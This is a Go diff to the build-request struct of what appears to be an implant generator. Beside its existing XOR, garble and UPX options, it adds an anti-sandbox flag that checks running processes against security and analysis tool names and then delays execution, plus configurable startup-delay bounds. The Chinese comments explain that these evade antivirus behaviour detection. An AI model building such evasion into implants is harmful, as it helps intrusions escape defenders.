@@ -59,6 +59,14 @@ type BuildRequest struct {
 	XORKeySize   int  `json:"xor_key_size"`
 	GarbleEnable bool `json:"garble_enabled"`
 	UPXEnable    bool `json:"upx_enabled"`
+	// EvasionScan 主动反沙箱进程检测（默认关闭）：枚举进程并与安全软件/分析工具
+	// 进程名比对后延迟执行。该行为会被国产杀软主动防御拦（见植入端
+	// evasion_scan_windows.go），且需要静态 API 导入与进程名字符串，故默认不编译。
+	EvasionScan bool `json:"evasion_scan"`
+	// 启动随机延迟（秒）：留空(0)时用服务端配置 implant.startup_delay_min/max，
+	// 再回退 2~10s。显式传值可覆盖（如 20/60 拉长"启动即行为"的时间窗）。
+	StartupDelayMin int `json:"startup_delay_min"`
+	StartupDelayMax int `json:"startup_delay_max"`
 }
 
 type BuildResponse struct {
